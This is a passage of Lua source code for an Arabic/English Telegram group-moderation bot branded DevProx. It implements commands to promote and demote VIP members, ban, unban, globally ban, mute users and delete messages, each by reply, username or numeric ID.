Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ is now a VIP member ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم رفعه ( عضو مميز ) سابقا*', 1, 'md')
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ User ؛ '..result.sender_user_id_..' ، 🚷\n🌟┇ has been a VIP member ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم رفعه ( عضو مميز )*', 1, 'md')
end
DevAbs:sadd(DevProx..abs, result.sender_user_id_)
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
----------------------------------------DevProx-------------------------------------------------------
if text:match("^[Ss]etvip @(.*)$") then
local ap = {string.match(text, "^([Ss]etvip) @(.*)$")}
function promote_by_username(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.id_)
local DevProx_res = user_info_
if user_info_ then
if result.id_ then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*🚸┇ The User ؛ '..result.id_..' ، 🚷\n🚸┇ promoted to VIP member ✅ \nֆ                 ֆ*'
else
texts = '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم رفعه ( عضو مميز )*'
end
DevAbs:sadd(DevProx..'bot:VipGroup:'..msg.chat_id_, result.id_)
else
if not DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*🚸┇ Username is not correct *'
else
texts = '*🚸┇ المعرف غير صحيح *'
end
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(ap[2],promote_by_username)
end
-------------------------------DevProx----------------------------------------------------------------
if text:match("^[Ss]etvip (%d+)$") then
local ap = {string.match(text, "^([Ss]etvip) (%d+)$")}
local user_info_ = DevAbs:get(DevProx..'user:Name' .. ap[2])
local DevProx_res = user_info_
if user_info_ then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ User ؛ '..ap[2]..' ، 🚷\n🚸┇ has been a VIP member ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..ap[2]..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم رفعه ( عضو مميز )*', 1, 'md')
end
end
DevAbs:sadd(DevProx..'bot:VipGroup:'..msg.chat_id_, ap[2])
end
-------------------------------------DevProx----------------------------------------------------------
local text = msg.content_.text_:gsub('تنزيل مميز','Demvip')
if text:match("^[Dd]emvip$") and msg.reply_to_message_id_ ~= 0 then
function demote_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
local abs = 'bot:VipGroup:'..msg.chat_id_
if not DevAbs:sismember(DevProx..abs, result.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ is not a VIP member ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *لم يتم رفعه ( مميز ) سابقا*', 1, 'md')
end
else
DevAbs:srem(DevProx..abs, result.sender_user_id_)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The vip ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ was removed from VIP member ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *المميز* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم تنزيله من ( قائمه التمييز )*', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,demote_by_reply)
end
-----------------------------------------DevProx------------------------------------------------------
if text:match("^[Dd]emvip @(.*)$") then
local abs = 'bot:VipGroup:'..msg.chat_id_
local ap = {string.match(text, "^([Dd]emvip) @(.*)$")}
function demote_by_username(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.id_)
local DevProx_res = user_info_
if user_info_ then
if result.id_ then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*🚸┇ The User ؛ '..result.id_..' ، 🚷\n🚸┇ was demoted from VIP member ✅ \nֆ                 ֆ*'
else
texts = '🏆┇ *المميز* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم تنزيله من ( قائمه التمييز )*'
end
DevAbs:srem(DevProx..abs, result.id_)
else
if not DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*🚸┇ Username is not correct *'
else
texts = '*⏱┇ المعرف غير صحيح *'
end
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(ap[2],demote_by_username)
end
--------------------------------DevProx---------------------------------------------------------------
if text:match("^[Dd]emvip (%d+)$") then
local abs = 'bot:VipGroup:'..msg.chat_id_
local ap = {string.match(text, "^([Dd]emvip) (%d+)$")}
local user_info_ = DevAbs:get(DevProx..'user:Name' .. ap[2])
local DevProx_res = user_info_
if user_info_ then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The vip ؛ '..ap[2]..' ، 🚷\n🚸┇ was removed from VIP member ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *المميز* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..ap[2]..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم تنزيله من ( قائمه التمييز )*', 1, 'md')
end
end
DevAbs:srem(DevProx..abs, ap[2])
end
end
----------------------------------------DevProx--------------------------------------------------------------       
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Dd]el$") or text:match("^حذف$") and msg.reply_to_message_id_ ~= 0 then
local id = msg.id_
local msgs = {[0] = id}
delete_msg(msg.chat_id_,{[0] = msg.reply_to_message_id_})
delete_msg(msg.chat_id_,msgs)
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم حذف الرساله مع رساله الامر ', 1, 'md')
end
if is_monsh(msg.sender_user_id_, msg.chat_id_) then
if text:match("^تفعيل الحظر$") or text:match("^تفعيل الطرد$") then
DevAbs:del("DevProx:lock:ban"..bot_id..msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم تفعيل الحظر ', 1, 'md')
end
if text:match("^تعطيل الحظر$") or text:match("^تعطيل الطرد$") and is_monsh(msg.sender_user_id_, msg.chat_id_) then
DevAbs:set("DevProx:lock:ban"..bot_id..msg.chat_id_,"DevProx")
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم تعطيل الحظر ', 1, 'md')
end
end
-----------------------------------------DevProx-----------------------------------------------------
if text:match("^حظر$") and msg.reply_to_message_id_ ~= 0 then
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("DevProx:lock:ban"..bot_id..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ لا تستطيع الحظر او الطرد \n🏆┇ لانه معطل من قبل المنشئ ', 1, 'md')
return "DevProx"
end
function ban_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
local abs = 'bot:banned:'..msg.chat_id_
if not is_momod(result.sender_user_id_, result.chat_id_) then
if DevAbs:sismember(DevProx..abs, result.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ is already banned ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم ( حظره ) سابقا*', 1, 'md')
end
chat_kick(result.chat_id_, result.sender_user_id_)
else
DevAbs:sadd(DevProx..abs, result.sender_user_id_)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..result.sender_user_id_..' ، 🚷\n⏱┇ has been banned ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم ( حظره ) من المجموعه*', 1, 'md')
end
chat_kick(result.chat_id_, result.sender_user_id_)
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,ban_by_reply)
end  
---------------------------------------DevProx--------------------------------------------------------
if text:match('^حظر @(.*)$') and is_momod(msg.sender_user_id_, msg.chat_id_) then
local ap = {string.match(text, '^(حظر) @(.*)$')}
function ban_by_username(extra, result, success)
local abs = 'bot:banned:'..msg.chat_id_
if result.id_ then 
if is_momod(result.id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ لا تستطيع حظر او طرد الادمنيه ', 1, 'md')
else
if DevAbs:sismember(DevProx..abs, result.id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( [@'..ap[2]..'] )\n📤┇ *ايديه* ( *'..result.id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم ( حظره ) سابقا*', 1, 'md')
else
DevAbs:sadd(DevProx..abs, result.id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( [@'..ap[2]..'] )\n📤┇ *ايديه* ( *'..result.id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم ( حظره ) من المجموعه*', 1, 'md')
chat_kick(msg.chat_id_, result.id_)
end
end
end
end
resolve_username(ap[2],ban_by_username)
end
----------------------------------DevProx-------------------------------------------------------------
if text:match("^[Bb]an (%d+)$") then
local ap = {string.match(text, "^([Bb]an) (%d+)$")}
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("DevProx:lock:ban"..bot_id..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ لا تستطيع الحظر او الطرد \n🏆┇ لانه معطل من قبل المنشئ ', 1, 'md')
return "DevProx"
end
local user_info_ = DevAbs:get(DevProx..'user:Name' .. ap[2])
local DevProx_res = user_info_
if user_info_ then
if not is_momod(ap[2], msg.chat_id_) then
DevAbs:sadd(DevProx..'bot:banned:'..msg.chat_id_, ap[2])
chat_kick(msg.chat_id_, ap[2])
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..ap[2]..' ، 🚷\n🚸┇ has been banned ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..ap[2]..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم ( حظره ) من المجموعه*', 1, 'md')
end
end
end
end
-----------------------------------DevProx------------------------------------------------------------
local text = msg.content_.text_:gsub('حذف الكل','Delall')
if text:match("^[Dd]elall$") and msg.reply_to_message_id_ ~= 0 then
function delall_by_reply(extra, result, success)
del_all_msgs(result.chat_id_, result.sender_user_id_)
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,delall_by_reply)
end
---------------------------------------DevProx--------------------------------------------------------
if text:match("^[Dd]elall (%d+)$") then
local ass = {string.match(text, "^([Dd]elall) (%d+)$")}
if not ass then
return false
else
del_all_msgs(msg.chat_id_, ass[2])
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, ' All messages from User : '..ass[2]..' has been deleted ', 1, 'html')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '✺❘ كل رسائل العضو : '..ass[2]..'\n ✺❘ تم حذفها ✅', 1, 'html')
end
end
end
-----------------------------------DevProx------------------------------------------------------------
if text:match("^[Dd]elall @(.*)$") then
local ap = {string.match(text, "^([Dd]elall) @(.*)$")}
function delall_by_username(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.id_)
local DevProx_res = user_info_
if user_info_ then
if result.id_ then
del_all_msgs(msg.chat_id_, result.id_)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = '*🚸┇ All messages from User ؛ '..result.id_..' ، 🚷\n🚸┇ has been deleted ✅ \nֆ                 ֆ*'
else
text = '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم ( حذف كل رسائله ) *'
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = '*🚸┇ Username is not correct *'
else
text = '🚸┇ المعرف غير صحيح *'
end
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(ap[2],delall_by_username)
end
-------------------------------------DevProx----------------------------------------------------------
local text = msg.content_.text_:gsub('الغاء حظر','Unban')
if text:match("^[Uu]nban$") and msg.reply_to_message_id_ ~= 0 then
function DevProx(extra, result, success)
function unban_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
local abs = 'bot:banned:'..msg.chat_id_
if not DevAbs:sismember(DevProx..abs, result.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ is not banned ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *لم يتم ( حظره ) سابقا*', 1, 'md')
end
else
DevAbs:srem(DevProx..abs, result.sender_user_id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ has been unbanned ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *المحظور* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم ( الغاء حظره ) من المجموعه*', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unban_by_reply)
end
channel_get_kicked(msg.chat_id_,DevProx)
end
---------------------------------DevProx--------------------------------------------------------------
if text:match("^[Uu]nban @(.*)$") then
local ap = {string.match(text, "^([Uu]nban) @(.*)$")}
function unban_by_username(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.id_)
local DevProx_res = user_info_
if user_info_ then
if result.id_ then
if not DevAbs:sismember(DevProx..'bot:banned:'..msg.chat_id_, result.id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..result.id_..' ، 📤\n🚸┇ is not banned ✅ \nֆ                 ֆ*', 1, 'md')
else
text = '🏆┇ العضو ( '..DevProx_res..' )\n📤┇ ايديه ( '..result.id_..' )\n⏱┇ بواسطه ( '..renk_DevProx(msg)..' )\n☑️┇ لم يتم ( حظره ) سابقا'
end
else
DevAbs:srem(DevProx..'bot:banned:'..msg.chat_id_, result.id_)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = '*🚸┇ The User ؛ '..result.id_..' ، 🚷\n🚸┇ has been unbanned ✅ \nֆ                 ֆ*'
else
text = '🏆┇ المحظور ( '..DevProx_res..' )\n📤┇ ايديه ( '..result.id_..' )\n⏱┇ بواسطه ( '..renk_DevProx(msg)..' )\n☑️┇ تم ( الغاء حظره ) من المجموعه'
end
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = '*🚸┇ Username is not correct *'
else
text = '*🚸┇ المعرف غير صحيح *'
end
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(ap[2],unban_by_username)
end
--------------------------------DevProx---------------------------------------------------------------
if text:match("^[Uu]nban (%d+)$") then
local ap = {string.match(text, "^([Uu]nban) (%d+)$")}
local user_info_ = DevAbs:get(DevProx..'user:Name' .. ap[2])
local DevProx_res = user_info_
if user_info_ then
if not DevAbs:sismember(DevProx..'bot:banned:'..msg.chat_id_, ap[2]) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*⏱┇ The User ؛ '..ap[2]..' ، 🚷\n🚸┇ has been unbanned ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..ap[2]..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *لم يتم ( حظره ) سابقا*', 1, 'md')
end
else
DevAbs:srem(DevProx..'bot:banned:'..msg.chat_id_, ap[2])
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..ap[2]..' ، 🚷\n🚸┇ has been unbanned ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *المحظور* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..ap[2]..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم ( الغاء حظره ) من المجموعه*', 1, 'md')
end
end
end
end
-------------------------------------DevProx--------------------------------------------------------
local text = msg.content_.text_:gsub('حظر عام','Banall')
if text:match("^[Bb]anall$") and is_sudo(msg) and msg.reply_to_message_id_ then
function gban_by_reply(extra, result, success)
local gps = DevAbs:scard(DevProx.."bot:groups")
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
local abs = 'bot:gban:'
DevAbs:sadd(DevProx..abs, result.sender_user_id_)
chat_kick(result.chat_id_, result.sender_user_id_)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ has been globaly banned ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم حظره من ( '..gps..' ) مجموعه*', 1, 'md')
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,gban_by_reply)
end
----------------------------------------DevProx-------------------------------------------------------
if text:match("^[Bb]anall @(.*)$") and is_sudo(msg) then
local aps = {string.match(text, "^([Bb]anall) @(.*)$")}
function gban_by_username(extra, result, success)
local gps = DevAbs:scard(DevProx.."bot:groups")
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.id_)
local DevProx_res = user_info_
if user_info_ then
local abs = 'bot:gban:'
if result.id_ then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = '*🚸┇ The User ؛ '..result.id_..' ، 🚷\n🚸┇ has been globaly banned ✅ \nֆ                 ֆ*'
else
text = '🏆┇ العضو ( '..DevProx_res..' )\n📤┇ ايديه ( '..result.id_..' )\n⏱┇ بواسطه ( '..renk_DevProx(msg)..' )\n☑️┇ تم حظره من ( '..gps..' ) مجموعه'
end
DevAbs:sadd(DevProx..abs, result.id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = '*🚸┇ Username is not correct *'
else
text = '*🚸┇ المعرف غير صحيح *'
end
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(aps[2],gban_by_username)
end
----------------------------------DevProx-------------------------------------------------------------
if text:match("^[Bb]anall (%d+)$") and is_sudo(msg) then
local ap = {string.match(text, "^([Bb]anall) (%d+)$")}
local gps = DevAbs:scard(DevProx.."bot:groups")
local user_info_ = DevAbs:get(DevProx..'user:Name' .. ap[2])
local DevProx_res = user_info_
if user_info_ then
local abs = 'bot:gban:'
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..ap[2]..' ، 🚷\n🚸┇ has been globaly banned ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..ap[2]..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم حظره من ( '..gps..' ) مجموعه*', 1, 'md')
end
end
DevAbs:set(DevProx..'bot:gban:'..ap[2],true)
DevAbs:sadd(DevProx..abs, ap[2])
end
---------------------------------------DevProx--------------------------------------------------------
local text = msg.content_.text_:gsub('الغاء العام','unbanall')
if text:match("^[Uu]nbanall$") and is_sudo(msg) and msg.reply_to_message_id_ then
function ungban_by_reply(extra, result, success)
local gps = DevAbs:scard(DevProx.."bot:groups")
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
local abs = 'bot:gban:'
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ has been unbanned (Gban) ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم الغاء حظره من ( '..gps..' ) مجموعه*', 1, 'md')
end
end
DevAbs:srem(DevProx..abs, result.sender_user_id_)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,ungban_by_reply)
end
------------------------------------------DevProx-----------------------------------------------------
if text:match("^[Uu]nbanall @(.*)$") and is_sudo(msg) then
local apid = {string.match(text, "^([Uu]nbanall) @(.*)$")}
function ungban_by_username(extra, result, success)
local gps = DevAbs:scard(DevProx.."bot:groups")
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.id_)
local DevProx_res = user_info_
if user_info_ then
local abs = 'bot:gban:'
if result.id_ then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = '*🚸┇ The User ؛ '..result.id_..' ، 🚷\n🚸┇ has been unbanned (Gban) ✅ \nֆ                 ֆ*'
else
text = '🏆┇ العضو ( '..DevProx_res..' )\n📤┇ ايديه ( '..result.id_..' )\n⏱┇ بواسطه ( '..renk_DevProx(msg)..' )\n☑️┇ تم الغاء حظره من ( '..gps..' ) مجموعه'
end
end
DevAbs:srem(DevProx..abs, result.id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = '*🚸┇ Username is not correct *'
else
text = '*🚸┇ المعرف غير صحيح *'
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(apid[2],ungban_by_username)
end
---------------------------------DevProx--------------------------------------------------------------
if text:match("^[Uu]nbanall (%d+)$") and is_sudo(msg) then
local ap = {string.match(text, "^([Uu]nbanall) (%d+)$")}
local gps = DevAbs:scard(DevProx.."bot:groups")
local user_info_ = DevAbs:get(DevProx..'user:Name' .. ap[2])
local DevProx_res = user_info_
if user_info_ then
local abs = 'bot:gban:'
DevAbs:srem(DevProx..abs, ap[2])
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..ap[2]..' ، 🚸\n📤┇ has been unbanned (Gban) ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..ap[2]..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم الغاء حظره من ( '..gps..' ) مجموعه*', 1, 'md')
end
end
end
-----------------------------------------DevProx------------------------------------------------------
if text:match("^كتم$") and msg.reply_to_message_id_ ~= 0 then
function mute_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ لا تستطيع كتمي ', 1, 'md')
return false 
end 
if is_momod(result.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *لا تستطيع كتم* ( ['..DevProx_res..'] )\n📤┇ *لانه يمتلك احدى الرتب ↓↓*\n*🚸┇ ( مميز - ادمن - مدير - منشئ - مطور )*', 1, 'md')
else 
DevAbs:sadd(DevProx..'bot:muted:'..msg.chat_id_, result.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم  (كتمه ) بنجاح*', 1, 'md')
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
end
----------------------------------------DevProx-------------------------------------------------------
if text:match('^كتم @(.*)$') and is_momod(msg.sender_user_id_, msg.chat_id_) then
local ap = {string.match(text, '^(كتم) @(.*)$')}
function mute_by_username(extra, result, success)
local abs = 'bot:muted:'..msg.chat_id_
if result.id_ then 
if is_momod(result.id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ لا تستطيع كتم الرتب ', 1, 'md')
else
if DevAbs:sismember(DevProx..abs, result.id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( [@'..ap[2]..'] )\n📤┇ *ايديه* ( *'..result.id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم ( كتمه ) سابقا*', 1, 'md')
else
DevAbs:sadd(DevProx..abs, result.id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( [@'..ap[2]..'] )\n📤┇ *ايديه* ( *'..result.id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم ( كتمه ) بنجاح*', 1, 'md')
end
end
end
end
resolve_username(ap[2],mute_by_username)
end
---------------------------------DevProx--------------------------------------------------------------
if text:match("^[Mm]uteuser (%d+)$") then
local ap = {string.match(text, "^([Mm]uteuser) (%d+)$")}
local user_info_ = DevAbs:get(DevProx..'user:Name' .. ap[2])
local DevProx_res = user_info_
if user_info_ then
if DevAbs:sismember(DevProx..'bot:muted:'..msg.chat_id_, ap[2]) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
